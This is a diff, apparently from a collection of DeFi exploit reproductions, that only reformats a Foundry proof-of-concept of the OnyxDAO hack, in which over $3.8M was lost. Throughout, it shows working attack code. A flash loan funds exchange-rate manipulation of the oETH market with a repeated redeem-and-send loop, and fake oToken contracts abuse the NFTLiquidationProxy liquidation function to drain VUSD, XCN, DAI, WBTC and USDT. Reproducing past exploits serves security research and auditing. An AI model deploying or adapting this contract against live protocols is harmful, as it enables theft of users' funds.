@@ -6,7 +6,7 @@ import "../interface.sol";
 
 // @KeyInfo - Total Lost : 4.1M VUSD, 7.35M XCN, 5K DAI, 0.23 WBTC, 50K USDT (>$3.8M USD)
 // Attacker : https://etherscan.io/address/0x680910cf5fc9969a25fd57e7896a14ff1e55f36b
-// Attack Contract : 
+// Attack Contract :
 //      - Main: https://etherscan.io/address/0xa57eda20be51ae07df3c8b92494c974a92cf8956
 //      - Rate Manipulator: https://etherscan.io/address/0xae7d68b140ed075e382e0a01d6c67ac675afa223
 //      - Fake oTokenRepay: https://etherscan.io/address/0x4f8b8c1b828147c1d6efc37c0326f4ac3e47d068
@@ -42,21 +42,21 @@ contract OnyxDAO_exp is Test {
     address attacker = makeAddr("attacker");
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 20834658 - 1);
+        vm.createSelectFork("mainnet", 20_834_658 - 1);
     }
 
     function testPoC() public {
         vm.startPrank(attacker);
         AttackerC attackerC = new AttackerC();
 
-        // tx: 
+        // tx:
         attackerC.attack();
 
-        console.log('Final balance in VUSD :', IERC20(VUSD).balanceOf(address(attacker)));
-        console.log('Final balance in XCN:', IERC20(XCN).balanceOf(address(attacker)));
-        console.log('Final balance in DAI:', IERC20(DAI).balanceOf(address(attacker)));
-        console.log('Final balance in WBTC:', IERC20(BTC).balanceOf(address(attacker)));
-        console.log('Final balance in USDT:', IERC20(_USDT).balanceOf(address(attacker)));
+        console.log("Final balance in VUSD :", IERC20(VUSD).balanceOf(address(attacker)));
+        console.log("Final balance in XCN:", IERC20(XCN).balanceOf(address(attacker)));
+        console.log("Final balance in DAI:", IERC20(DAI).balanceOf(address(attacker)));
+        console.log("Final balance in WBTC:", IERC20(BTC).balanceOf(address(attacker)));
+        console.log("Final balance in USDT:", IERC20(_USDT).balanceOf(address(attacker)));
     }
 }
 
@@ -74,7 +74,7 @@ contract AttackerC {
             address(this),
             tokens,
             amounts,
-            hex'3030' // WHY????
+            hex"3030" // WHY????
         );
     }
 
@@ -87,7 +87,7 @@ contract AttackerC {
         uint256 balWETH = IERC20(weth).balanceOf(address(this)); // L7
 
         IFS(weth).withdraw(balWETH); // L8
-        uint256 cashOETH1 =  IFS(oETH).getCash(); // L11
+        uint256 cashOETH1 = IFS(oETH).getCash(); // L11
         IFS(oETH).mint{value: balWETH - 0.5 ether}(); // L12
 
         address[] memory markets = IFS(Unitroller).getAllMarkets(); // L22
@@ -132,22 +132,18 @@ contract AttackerC {
         address fake_oTokenRepay = address(new Fake_oTokenRepay(fake_underlying, address(this)));
 
         IFS(VUSD).transfer(fake_oTokenRepay, 1); // L2313
-        
+
         IFS(NFTLiquidationProxy).liquidateWithSingleRepay( // L2316
-            payable(address(this)),
-            fake_oTokenCollateral,
-            fake_oTokenRepay,
-            4764735291322
-        );
-        IFS(VUSD).approve(uniV3Router, 300000000000);
+        payable(address(this)), fake_oTokenCollateral, fake_oTokenRepay, 4_764_735_291_322);
+        IFS(VUSD).approve(uniV3Router, 300_000_000_000);
 
         IFS.ExactInputSingleParams memory input = IFS.ExactInputSingleParams( // L2712
             VUSD, // address tokenIn;
             weth, // address tokenOut;
             3000, // uint24 fee;
             address(this), // address recipient;
-            1727352120, // uint256 deadline;
-            300000000000, // uint256 amountIn;
+            1_727_352_120, // uint256 deadline;
+            300_000_000_000, // uint256 amountIn;
             0, // uint256 amountOutMinimum;
             0 // uint160 sqrtPriceLimitX96;
         );
@@ -168,40 +164,40 @@ contract AttackerC {
 
 contract AttackerC2 {
     function attack() external {
-        uint256 x = 215227348 + 1;
-        uint256 y = 330454691 + 10;
+        uint256 x = 215_227_348 + 1;
+        uint256 y = 330_454_691 + 10;
 
         IFS _oETH = IFS(oETH);
         _oETH.exchangeRateStored(); // view
         oETH.call{value: x}("");
 
-
-        for (uint i; i < 54; i++) {
-            _oETH.exchangeRateStored(); // view 
-            _oETH.redeemUnderlying(y); 
-            _oETH.exchangeRateStored(); // view 
-            oETH.call{value: x}(""); 
+        for (uint256 i; i < 54; i++) {
+            _oETH.exchangeRateStored(); // view
+            _oETH.redeemUnderlying(y);
+            _oETH.exchangeRateStored(); // view
+            oETH.call{value: x}("");
         }
-        
+
         _oETH.exchangeRateStored(); // view
         _oETH.redeemUnderlying(y);
         payable(address(msg.sender)).transfer(address(this).balance);
     }
 
-    receive() external payable {
-    }
+    receive() external payable {}
 }
 
 contract Fake_oTokenRepay {
     address fake_underlying;
     address attackerC;
 
-    constructor (address _fake_underlying, address _attackerC) {
+    constructor(address _fake_underlying, address _attackerC) {
         fake_underlying = _fake_underlying;
         attackerC = _attackerC;
     }
 
-    function borrowBalanceCurrent(address) external returns(uint256) {
+    function borrowBalanceCurrent(
+        address
+    ) external returns (uint256) {
         return 0;
     }
 
@@ -209,19 +205,23 @@ contract Fake_oTokenRepay {
         return fake_underlying;
     }
 
-    function liquidateBorrow(address, uint256, address) external returns(uint256) {
+    function liquidateBorrow(address, uint256, address) external returns (uint256) {
         return 0;
     }
 
-    function mint(uint256) external returns(bool) {
+    function mint(
+        uint256
+    ) external returns (bool) {
         return false;
     }
 
-    function balanceOf(address) external returns(uint256) {
+    function balanceOf(
+        address
+    ) external returns (uint256) {
         return 0;
     }
 
-    function transfer(address, uint256) external returns(bool) {
+    function transfer(address, uint256) external returns (bool) {
         IFS(VUSD).approve(oVUSD, type(uint256).max); // L2477
         IFS(oVUSD).liquidateBorrow(attackerC, 1, oETH); // L2480
         uint256 bal_oETH = IFS(oETH).balanceOf(address(this)); // L2691
@@ -234,21 +234,23 @@ contract Fake_oTokenRepay {
 }
 
 contract Fake_underlying {
-    function transferFrom(address, address, uint256) external returns(bool) {
+    function transferFrom(address, address, uint256) external returns (bool) {
         return true;
     }
 
-    function approve(address, uint256) external returns(bool) {
+    function approve(address, uint256) external returns (bool) {
         return true;
     }
 
-    function transfer(address, uint256) external returns(bool) {
+    function transfer(address, uint256) external returns (bool) {
         return true;
     }
 }
 
 contract Fake_oTokenCollateral {
-    function balanceOf(address) external returns(uint256) {
+    function balanceOf(
+        address
+    ) external returns (uint256) {
         return 0;
     }
 
@@ -267,28 +269,45 @@ interface IFS is IERC20 {
     ) external;
 
     // WETH
-    function withdraw(uint wad) external;
+    function withdraw(
+        uint256 wad
+    ) external;
     function deposit() external payable;
 
     // OEther / OErc20Delegate
-    function getCash() external view returns (uint);
+    function getCash() external view returns (uint256);
     function mint() external payable;
-    function borrow(uint borrowAmount) external returns (uint);
+    function borrow(
+        uint256 borrowAmount
+    ) external returns (uint256);
     function underlying() external view returns (address);
-    function exchangeRateStored() external view returns (uint);
-    function redeemUnderlying(uint redeemAmount) external returns (uint);
+    function exchangeRateStored() external view returns (uint256);
+    function redeemUnderlying(
+        uint256 redeemAmount
+    ) external returns (uint256);
 
     // Unitroller
     function getAllMarkets() external view returns (address[] memory);
-    function enterMarkets(address[] calldata oTokens) external returns (uint[] memory);
-    function getAccountLiquidity(address account) external view returns (uint, uint, uint);
+    function enterMarkets(
+        address[] calldata oTokens
+    ) external returns (uint256[] memory);
+    function getAccountLiquidity(
+        address account
+    ) external view returns (uint256, uint256, uint256);
     function oracle() external view returns (address);
 
     // ChainlinkOracle
-    function getUnderlyingPrice(address oToken) external view returns (uint);
+    function getUnderlyingPrice(
+        address oToken
+    ) external view returns (uint256);
 
     // NFTLiquidationProxy
-    function liquidateWithSingleRepay(address payable borrower, address oTokenCollateral, address oTokenRepay, uint256 repayAmount) external payable;
+    function liquidateWithSingleRepay(
+        address payable borrower,
+        address oTokenCollateral,
+        address oTokenRepay,
+        uint256 repayAmount
+    ) external payable;
 
     // Uniswap V3: SwapRouter
     struct ExactInputSingleParams {
@@ -302,11 +321,19 @@ interface IFS is IERC20 {
         uint160 sqrtPriceLimitX96;
     }
 
-    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
+    function exactInputSingle(
+        ExactInputSingleParams calldata params
+    ) external payable returns (uint256 amountOut);
 
     // oVUSD
-    function liquidateBorrow(address borrower, uint256 repayAmount, address oTokenCollateral) external returns (uint256);
+    function liquidateBorrow(
+        address borrower,
+        uint256 repayAmount,
+        address oTokenCollateral
+    ) external returns (uint256);
 
     // oETH
-    function redeem(uint redeemTokens) external returns (uint);
+    function redeem(
+        uint256 redeemTokens
+    ) external returns (uint256);
 }
